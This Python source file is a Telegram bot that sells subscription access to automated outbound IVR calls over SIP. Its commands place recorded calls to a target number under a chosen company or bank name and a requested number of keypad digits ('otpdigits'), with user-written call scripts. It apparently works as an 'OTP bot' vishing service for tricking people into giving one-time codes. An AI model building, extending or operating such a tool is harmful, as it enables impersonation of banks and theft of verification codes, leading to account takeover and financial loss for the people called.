"""
Telegram bot — outbound IVR via SIP (client caller ID, no spoof).

Commands mirror structure of legacy bot but use AriCallManager instead of Telnyx.
"""

from __future__ import annotations

import datetime
import logging
import random
import string
import uuid

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ParseMode, Update
from telegram.ext import (
    CallbackContext,
    CallbackQueryHandler,
    CommandHandler,
    ConversationHandler,
    Filters,
    MessageHandler,
    Updater,
)

from config import ADMINS, TELEGRAM_BOT_TOKEN
from db import check_subscription, keys, save_script, users
from sip_call_manager import manager

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

FIRST, SECOND, THIRD = range(3)


def _parse_e164(raw: str) -> str:
    return "".join(c for c in raw if c.isdigit())


def _place_call(
    update: Update,
    context: CallbackContext,
    route: str,
    number: str,
    name: str,
    service: str,
    digits: str = "4",
    extra: dict | None = None,
    record: bool = False,
) -> None:
    if not check_subscription(update.effective_chat.id):
        update.message.reply_text("⏳ No active subscription. Contact admin.")
        return
    if manager is None:
        update.message.reply_text("❌ Telephony not ready (ARI). Start api.py first.")
        return

    chat_id = update.effective_chat.id
    tag = update.message.chat.username or "user"
    meta = {
        "name": name,
        "service": service,
        "company": service,
        "digits": digits,
        "otpdigits": digits,
        **(extra or {}),
    }
    call_info = {
        "route": route,
        "number": number,
        "name": name,
        "service": service,
        "digits": digits,
        "tag": tag,
        "chatid": chat_id,
        "meta": meta,
        "record": record,
    }
    context.user_data["call_info"] = call_info

    try:
        ctx = manager.originate(
            to_number=number,
            route=route,
            chat_id=chat_id,
            tag=tag,
            meta=meta,
            record=record,
        )
        context.user_data["channel_id"] = ctx.channel_id
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("End call", callback_data="end_call")]])
        update.message.reply_text(
            f"📞 Calling <code>{number}</code>\n"
            f"Caller ID: your SIP trunk number (no spoof).\n"
            f"Channel: <code>{ctx.channel_id}</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=kb,
        )
    except Exception as e:
        logger.exception("originate failed")
        update.message.reply_text(f"❌ Call failed: {e}")


def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text(
        "🚀 <b>SIP IVR Platform</b>\n\n"
        "Outbound calls use <b>your</b> SIP trunk caller ID.\n\n"
        "Commands:\n"
        "/call — generic IVR\n"
        "/pin — reference PIN flow\n"
        "/bank — bank-named company flow\n"
        "/email — recorded message flow\n"
        "/customcall — custom 3-part script\n"
        "/createscript — build script\n"
        "/recall — redial last\n"
        "/plan — subscription\n",
        parse_mode=ParseMode.HTML,
    )


def call_cmd(update: Update, context: CallbackContext) -> None:
    msg = update.message.text.split()
    if len(msg) < 6:
        update.message.reply_text(
            "Usage: /call &lt;number&gt; &lt;company&gt; &lt;contact_name&gt; &lt;digits&gt;\n"
            "Example: /call 12025551234 AcmeCorp John 4",
            parse_mode=ParseMode.HTML,
        )
        return
    number = _parse_e164(msg[1])
    service = msg[2]
    name = msg[3]
    digits = msg[4]
    _place_call(update, context, "voice", number, name, service, digits, record=True)


def pin_cmd(update: Update, context: CallbackContext) -> None:
    msg = update.message.text.split()
    if len(msg) < 6:
        update.message.reply_text("Usage: /pin number company name digits")
        return
    _place_call(update, context, "pin", _parse_e164(msg[1]), msg[3], msg[2], msg[4], record=True)


def bank_cmd(update: Update, context: CallbackContext) -> None:
    msg = update.message.text.split()
    if len(msg) < 6:
        update.message.reply_text("Usage: /bank number bank_name contact_name digits")
        return
    _place_call(
        update,
        context,
        "bank",
        _parse_e164(msg[1]),
        msg[3],
        msg[2],
        msg[4],
        extra={"bank": msg[2]},
        record=True,
    )


def email_cmd(update: Update, context: CallbackContext) -> None:
    msg = update.message.text.split()
    if len(msg) < 5:
        update.message.reply_text("Usage: /email number service contact_name")
        return
    _place_call(update, context, "email", _parse_e164(msg[1]), msg[3], msg[2], "1", record=True)


def customcall_cmd(update: Update, context: CallbackContext) -> None:
    msg = update.message.text.split()
    if len(msg) < 7:
        update.message.reply_text(
            "Usage: /customcall number company name digits script_id"
        )
        return
    _place_call(
        update,
        context,
        "custom",
        _parse_e164(msg[1]),
        msg[3],
        msg[2],
        msg[4],
        extra={"sid": msg[5]},
        record=True,
    )


def recall_cmd(update: Update, context: CallbackContext) -> None:
    info = context.user_data.get("call_info")
    if not info:
        update.message.reply_text("No previous call. Use /call first.")
        return
    fake_update = update
    _place_call(
        fake_update,
        context,
        info["route"],
        info["number"],
        info["name"],
        info["service"],
        info["digits"],
        extra=info.get("meta"),
        record=info.get("record", False),
    )


def end_call_cb(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()
    ch = context.user_data.get("channel_id")
    if ch and manager:
        manager.hangup(ch)
        query.edit_message_text(text=query.message.text + "\n\n📴 Call ended.")


def plan_cmd(update: Update, context: CallbackContext) -> None:
    doc = users.find_one({"chat_id": update.effective_chat.id})
    if not doc:
        update.message.reply_text("No subscription.")
        return
    update.message.reply_text(f"Expires: {doc.get('expiration_date')}")


def genkey_cmd(update: Update, context: CallbackContext) -> None:
    if update.effective_chat.id not in ADMINS:
        update.message.reply_text("Not allowed.")
        return
    duration = context.args[0] if context.args else "7Day"
    code = "-".join("".join(random.choices(string.ascii_uppercase + string.digits, k=5)) for _ in range(4))
    key = f"IVR-{code}"
    keys.insert_one({"key": key, "Duration": duration, "used": False})
    update.message.reply_text(key)


def redeem_cmd(update: Update, context: CallbackContext) -> None:
    if not context.args:
        update.message.reply_text("/redeem YOUR-KEY")
        return
    key = context.args[0]
    doc = keys.find_one({"key": key, "used": False})
    if not doc:
        update.message.reply_text("Invalid or used key.")
        return
    keys.update_one({"key": key}, {"$set": {"used": True}})
    exp = datetime.datetime.now() + datetime.timedelta(days=7)
    users.update_one(
        {"chat_id": update.effective_chat.id},
        {
            "$set": {
                "username": update.message.chat.username,
                "expiration_date": exp.strftime("%Y/%m/%d %H:%M:%S"),
            }
        },
        upsert=True,
    )
    update.message.reply_text("✅ Subscription active.")


def script_start(update: Update, context: CallbackContext) -> int:
    update.message.reply_text("Part 1 — intro (use {name} {company} {digits}):")
    return FIRST


def script_part1(update: Update, context: CallbackContext) -> int:
    context.user_data["p1"] = update.message.text
    update.message.reply_text("Part 2 — after press 1:")
    return SECOND


def script_part2(update: Update, context: CallbackContext) -> int:
    context.user_data["p2"] = update.message.text
    update.message.reply_text("Part 3 — closing:")
    return THIRD


def script_part3(update: Update, context: CallbackContext) -> int:
    sid = str(uuid.uuid4())[:8]
    save_script(
        sid,
        context.user_data["p1"],
        context.user_data["p2"],
        update.message.text,
        update.effective_chat.id,
    )
    update.message.reply_text(f"✅ Script id: <code>{sid}</code>", parse_mode=ParseMode.HTML)
    return ConversationHandler.END


def cancel(update: Update, context: CallbackContext) -> int:
    update.message.reply_text("Cancelled.")
    return ConversationHandler.END


def main() -> None:
    if not TELEGRAM_BOT_TOKEN:
        raise SystemExit("Set TELEGRAM_BOT_TOKEN in .env")

    # ARI must run in same process or separate service
    from api import init_ari

    init_ari()

    updater = Updater(TELEGRAM_BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", start))
    dp.add_handler(CommandHandler("call", call_cmd))
    dp.add_handler(CommandHandler("pin", pin_cmd))
    dp.add_handler(CommandHandler("bank", bank_cmd))
    dp.add_handler(CommandHandler("email", email_cmd))
    dp.add_handler(CommandHandler("customcall", customcall_cmd))
    dp.add_handler(CommandHandler("recall", recall_cmd))
    dp.add_handler(CommandHandler("plan", plan_cmd))
    dp.add_handler(CommandHandler("genkey", genkey_cmd))
    dp.add_handler(CommandHandler("redeem", redeem_cmd))
    dp.add_handler(CallbackQueryHandler(end_call_cb, pattern="^end_call$"))
    dp.add_handler(
        ConversationHandler(
            entry_points=[CommandHandler("createscript", script_start)],
            states={
                FIRST: [MessageHandler(Filters.text & ~Filters.command, script_part1)],
                SECOND: [MessageHandler(Filters.text & ~Filters.command, script_part2)],
                THIRD: [MessageHandler(Filters.text & ~Filters.command, script_part3)],
            },
            fallbacks=[CommandHandler("cancel", cancel)],
        )
    )
    updater.start_polling()
    logger.info("Telegram bot running")
    updater.idle()


if __name__ == "__main__":
    main()
